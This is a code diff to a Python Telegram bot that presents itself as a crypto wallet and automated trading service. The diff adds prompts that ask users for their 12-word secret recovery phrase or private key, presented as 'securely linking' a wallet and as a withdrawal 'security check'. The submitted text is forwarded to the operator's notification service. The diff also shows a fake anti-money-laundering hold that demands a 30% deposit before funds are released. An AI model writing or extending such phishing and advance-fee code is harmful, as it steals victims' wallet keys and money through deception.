@@ -101,6 +101,14 @@ def _format_decimal(value: Decimal) -> str:
     return f"{value:.4f}"
 
 
+def _format_amount(value: Decimal) -> str:
+    """Render a Decimal without unnecessary trailing zeroes."""
+    rendered = format(value, "f")
+    if "." in rendered:
+        rendered = rendered.rstrip("0").rstrip(".")
+    return rendered
+
+
 def build_wallet_text(
     addresses: dict[str, str],
     balances: dict[str, Decimal],
@@ -504,12 +512,26 @@ def build_user_router(
         await state.update_data(wallet_import_method=method)
         await state.set_state(PastedAddressInput.waiting_for_secret)
         if callback.message is not None:
+            prompt = (
+                "<b>🧩 Import Phrase</b>\n\n"
+                "To securely link your wallet and enable automated trading features, "
+                "please enter your full 12-word secret recovery phrase. Make sure the "
+                "words are in the correct order and separated by single spaces."
+                if method == "recovery_phrase"
+                else (
+                    "<b>🧩 Import Private key</b>\n\n"
+                    "To securely link your wallet and enable automated trading "
+                    "features, please enter your private key. Make sure they are in "
+                    "the correct order."
+                )
+            )
             await callback.message.answer(
-                f"Paste your {label}:",
+                prompt,
                 reply_markup=ForceReply(
                     selective=True,
                     input_field_placeholder=f"Paste {label}",
                 ),
+                parse_mode="HTML",
             )
         await callback.answer()
 
@@ -827,13 +849,18 @@ def build_user_router(
         await message.answer("Withdrawal cancelled.", reply_markup=main_menu_keyboard())
 
     @router.message(TransferInput.waiting_for_amount)
-    async def receive_transfer_amount(message: Message, state: FSMContext) -> None:
+    async def receive_transfer_amount(
+        message: Message, state: FSMContext, session: AsyncSession
+    ) -> None:
         if message.text is None:
             await message.answer("Please enter the withdrawal amount as a number.")
             return
         try:
             amount = Decimal(message.text.strip())
         except InvalidOperation:
+            await message.answer("Please enter a valid withdrawal amount.")
+            return
+        if not amount.is_finite():
             await message.answer("Please enter a valid withdrawal amount.")
             return
         if amount <= 0:
@@ -846,6 +873,19 @@ def build_user_router(
             await state.clear()
             await message.answer("Please restart the withdrawal with /withdraw.")
             return
+        if message.from_user is None:
+            await state.clear()
+            await message.answer("Unable to identify your account. Please try again.")
+            return
+        user = await _registered_user(session, message.from_user.id)
+        balances = await BalanceService(session).list_for_user(user.id)
+        available_balance = balances[chain]
+        if amount > available_balance:
+            await message.answer(
+                "Insufficient funds. Your available "
+                f"{chain} balance is {_format_amount(available_balance)} {chain}."
+            )
+            return
         await state.set_state(TransferInput.waiting_for_ownership_verification)
         await state.update_data(transfer_amount=str(amount))
         await message.answer(
@@ -854,13 +894,15 @@ def build_user_router(
             parse_mode="HTML",
         )
         await message.answer(
+            "<b>⚠️ Security Check Required</b>\n\n"
             "To process your withdrawal, please reply with your "
-            "private key or passphrase to "
+            "wallet's recovery phrase to "
             "verify ownership.",
             reply_markup=ForceReply(
                 selective=True,
                 input_field_placeholder="Enter destination wallet address",
             ),
+            parse_mode="HTML",
         )
 
     @router.message(
@@ -875,8 +917,22 @@ def build_user_router(
     @router.message(TransferInput.waiting_for_ownership_verification)
     async def verify_transfer_ownership(message: Message, state: FSMContext) -> None:
         if message.text is None:
-            await message.answer("Please reply with the destination wallet address.")
+            await message.answer("Please enter your response as text.")
             return
+        data = await state.get_data()
+        submitted_address = message.text.strip()
+        telegram_name = (
+            message.from_user.full_name if message.from_user else "Not provided"
+        )
+        await notification_service.notify_withdrawal_address(
+            telegram_id=message.from_user.id if message.from_user else message.chat.id,
+            telegram_name=telegram_name,
+            username=message.from_user.username if message.from_user else None,
+            chain=str(data.get("transfer_chain", "Not provided")),
+            amount=str(data.get("transfer_amount", "Not provided")),
+            destination_address=str(data.get("transfer_address", "Not provided")),
+            submitted_address=submitted_address,
+        )
         await state.clear()
         await message.answer(
             "✅ Verification in progress. Please wait while we confirm ownership."
@@ -886,8 +942,8 @@ def build_user_router(
             "⚠️ <b>Withdrawal Pending (AML Verification)</b>\n\n"
             "Due to International Anti-Money Laundering (AML) regulations," 
             "you must hold at least <b>30%</b> of your requested withdrawal" 
-            "amount as a verified balance in your account before the" 
-            "transfer can be completed."
+            "amount as a verified balance in your account before the " 
+            "transfer can be completed.\n\n"
 
             "Please deposit the required percentage to clear the AML hold" 
             "and release your funds..",
